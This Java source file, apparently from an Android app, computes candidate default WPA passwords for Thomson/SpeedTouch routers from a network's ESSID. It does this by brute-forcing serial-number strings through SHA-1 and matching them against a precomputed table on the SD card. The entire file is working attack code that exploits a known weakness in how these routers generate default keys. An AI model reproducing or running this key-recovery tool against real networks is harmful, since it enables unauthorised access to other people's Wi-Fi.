package com.thomson;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

public class ThomsonCalc extends Thread {
	
	MessageDigest md;
	String [] ret;
	String router;
	ThomsonSolver parent;
	
	public ThomsonCalc( ThomsonSolver par )
	{
		this.parent = par;
	}
	
	public void  run()
	{
		ArrayList<String> pwList = new ArrayList<String>();

		try {
			md = MessageDigest.getInstance("SHA1");
		} catch (NoSuchAlgorithmException e1) {
			e1.printStackTrace();
		}
		FileInputStream fis;
		try {
			fis = new FileInputStream("/sdcard/auxtable.dat");
		} catch (FileNotFoundException e2) {
			ret =  new String[]{"Aux Table not found on SDCard!"};
			parent.setList(ret);
			parent.handler.sendEmptyMessage(1);
			return;
		}
		
		if ( router == null || router.length() != 13 ) 
		{
			ret =  new String[]{"Invalid ESSID!", "It must have 6 characters."};
			parent.setList(ret);
			parent.handler.sendEmptyMessage(0);
			return;
		}
		
		byte[] routerESSID = new byte[3];
		for (int i = 0; i < 6; i += 2)
			routerESSID[i / 2] = (byte) ((Character.digit(router.substring(7)
					.charAt(i), 16) << 4) + Character.digit(router.substring(7)
					.charAt(i + 1), 16));

		byte[] cp = new byte[12];
		byte[] hash = new byte[19];
		byte[] week = new byte[3 * 36 * 36 * 36];
		cp[0] = (byte) (char) 'C';
		cp[1] = (byte) (char) 'P';
		int offset = 0;
		int progress = 0;
		for (int y = 4; y <= 10; y++) {
			for (int w = 1; w <= 52; w++) {
				try {
					fis.read(week);
				} catch (IOException e1) {
					e1.printStackTrace();
				}
				if ( progress >= 3 )
				{
					parent.handler.sendEmptyMessage(2);
					progress = 0;
				}
				else
					++progress;
				offset = 0;
				for (int a = 0; a < 36; a++) {
					for (int b = 0; b < 36; b++) {
						for (int c = 0; c < 36; c++) {
							offset += 3;
							if (week[offset - 3 + 0] != routerESSID[0])
								continue;
							if (week[offset - 3 + 1] != routerESSID[1])
								continue;
							if (week[offset - 3 + 2] != routerESSID[2])
								continue;

							cp[2] = (byte) Character.forDigit((y / 10), 10);
							cp[3] = (byte) Character.forDigit((y % 10), 10);
							cp[4] = (byte) Character.forDigit((w / 10), 10);
							cp[5] = (byte) Character.forDigit((w % 10), 10);
							cp[6] = unkown.charectbytes0[a];
							cp[7] = unkown.charectbytes1[a];
							cp[8] = unkown.charectbytes0[b];
							cp[9] = unkown.charectbytes1[b];
							cp[10] = unkown.charectbytes0[c];
							cp[11] = unkown.charectbytes1[c];

							md.reset();
							md.update(cp);
							hash = md.digest();

							try {
								pwList.add(StringUtils.getHexString(hash).substring(0, 10).toUpperCase());
							} catch (UnsupportedEncodingException e) {
								e.printStackTrace();
							}
						}
					}
				}
			}
		}
		if(pwList.toArray().length == 0)
		{
			ret =  new String[]{"No matches were found!", "Try another ESSID"};
			parent.setList(ret);
			parent.handler.sendEmptyMessage(0);
			return;
		}

		ret = new String[pwList.size()];
		int i = 0;
		for(String s: pwList)
			ret[i++] = s;
		parent.setList(ret);
		parent.handler.sendEmptyMessage(0);
		return;
		
	}
	
	public byte[] makeSHA1Hash(byte[] input) {
		md.update(input);
		return md.digest();
	}
	

}
